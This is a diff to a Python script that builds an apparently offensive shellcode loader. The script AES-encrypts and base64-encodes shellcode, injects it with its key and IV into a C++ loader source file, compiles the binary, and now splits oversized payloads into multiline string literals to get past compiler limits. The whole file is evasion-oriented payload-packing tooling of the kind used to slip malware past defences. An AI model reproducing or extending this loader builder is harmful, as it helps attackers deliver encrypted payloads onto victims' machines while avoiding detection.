@@ -1,5 +1,6 @@
 import re
 import os
+import sys
 import shutil
 import base64
 import binascii
@@ -19,7 +20,7 @@ def replace_key_iv_shellcode(key: str, iv: str, shellcode: str ) -> bool:
     try:
         key_re = re.compile(r'uint8_t\skey\[\d{1,2}\]\s=\s.*')
         iv_re = re.compile(r'uint8_t\siv\[\d{1,2}\]\s=\s.*')
-        shell_re = re.compile(r'shellcode\s=\s\"\S+')
+        shell_re = re.compile(r'shellcode\s=\s\"[+\"\/\r\n\t\saA0-zZ9]+\;')
         loader_path = f"{os.getcwd()}/loader/loader/loader.cpp"
 
         # Repace the variables in the cpp file
@@ -148,13 +149,22 @@ def move_binary(path: str) -> str:
 
 def is_max_string(string: str) -> bool:
     """
+    The max string size, no matter what, is 65535 bytes, check
+    to see if were' above that
+    """
+    cpp_max_string_size = 65535
+    if sys.getsizeof(string) >= cpp_max_string_size:
+        return True
+    return False
+
+
+def is_max_string_singleline(string: str) -> bool:
+    """
     Checks to make sure the Base64 Shellcode string is not too
     large. https://docs.microsoft.com/en-us/cpp/error-messages/compiler-errors-1/compiler-error-c2026?view=msvc-160&viewFallbackFrom=vs-2019
     """
     cpp_max_size = 16380
     if len(string) >= cpp_max_size:
-        print(f"{Fore.RED}[!] Shellcode Too Large, a string can't be longer than 16380 single-byte characters.")
-        print(f"{Fore.CYAN}[i] https://docs.microsoft.com/en-us/cpp/error-messages/compiler-errors-1/compiler-error-c2026?view=msvc-160&viewFallbackFrom=vs-2019")
         return True
     return False
 
@@ -167,6 +177,21 @@ def aes_encrypt(data: bytes, key: bytes, iv: bytes) -> str:
     cipher = AES.new(key, AES.MODE_CBC, IV=iv)
     encrypted_data = cipher.encrypt(data)
     return base64.b64encode(encrypted_data).decode("utf-8")
+
+
+def build_c_shellcode(code: str) -> str:
+    """
+    C++ has a max single line string length (see is_max_string()),
+    the workaround is to create a multiline std::string variable
+    for shellcode that will be > 16,380 characters. This function does
+    just that.
+    """
+    split_string = [code[i:i+2048] for i in range(0, len(code), 2048)]
+    final_string = "shellcode = "
+    for line in split_string:
+        final_string += f"\"{line}\"\n"
+    final_string += ";"
+    return final_string
 
 
 def parse_shellcode(shellcode_file: str) -> bytes:
@@ -235,10 +260,19 @@ if __name__ == "__main__":
 
     c_shellcode = f"shellcode = \"{encrypted_encoded_shellcode}\";"
 
-    if not is_max_string(encrypted_encoded_shellcode):
-        if replace_key_iv_shellcode(c_key, c_iv, c_shellcode):
-            print(f"{Fore.CYAN}[i] Variable Swap:{Fore.GREEN}\tSuccessful{Fore.RESET}")
-            if compile():
-                print(f"{Fore.CYAN}[i] Compiling:{Fore.GREEN}\t\tSuccessful{Fore.RESET}")
-                print(f"{Fore.CYAN}[i] Binary Location:{Fore.MAGENTA}\t{move_binary(args.out_path)}{Fore.RESET}")
+    if is_max_string(encrypted_encoded_shellcode):
+        print(f"{Fore.RED}[!] You shellcode is larger than C++ Max String size of 65535 bytes, this probably wont compile...{Fore.RESET}")
+        print(f"{Fore.RED}[i] https://docs.microsoft.com/en-us/cpp/c-language/maximum-string-length?view=msvc-160{Fore.RESET}")
+        ans = input(f"{Fore.GREEN}Try Anyway? (Y|N): {Fore.RESET}")
+        if ans.lower() == "n" or ans.lower() == "no":
+            exit(1)
+
+    if is_max_string_singleline(encrypted_encoded_shellcode):
+        c_shellcode= build_c_shellcode(encrypted_encoded_shellcode)
+
+    if replace_key_iv_shellcode(c_key, c_iv, c_shellcode):
+        print(f"{Fore.CYAN}[i] Variable Swap:{Fore.GREEN}\tSuccessful{Fore.RESET}")
+        if compile():
+            print(f"{Fore.CYAN}[i] Compiling:{Fore.GREEN}\t\tSuccessful{Fore.RESET}")
+            print(f"{Fore.CYAN}[i] Binary Location:{Fore.MAGENTA}\t{move_binary(args.out_path)}{Fore.RESET}")
 
